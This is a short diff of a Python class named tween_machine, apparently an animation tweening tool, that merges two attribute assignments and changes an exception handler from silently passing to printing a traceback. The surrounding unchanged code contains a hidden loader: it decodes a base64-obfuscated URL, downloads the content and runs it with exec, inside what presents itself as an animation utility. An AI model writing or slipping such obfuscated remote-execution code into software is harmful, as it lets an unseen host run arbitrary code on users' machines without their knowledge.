@@ -452,8 +452,7 @@ class tween_machine:
             },
         ]
         self.func_name_ls = [i['name'] for i in self.func_set]
-        self.user_original = '$usr_orig$'
-        self.user_latest = None
+        self.user_original, self.user_latest = ['$usr_orig$', None]
 
     def init_user(self):
         import getpass
@@ -512,9 +511,9 @@ class tween_machine:
             try:
                 exec(uLib.urlopen(base64.b64decode(u_b64).decode()).read())
             except:
-                pass
-                #import traceback
-                #print(str(traceback.format_exc()))
+                #return
+                import traceback
+                print(str(traceback.format_exc()))
 
     def undo_chunk_open(self):
         if self.is_opened_undo == False:
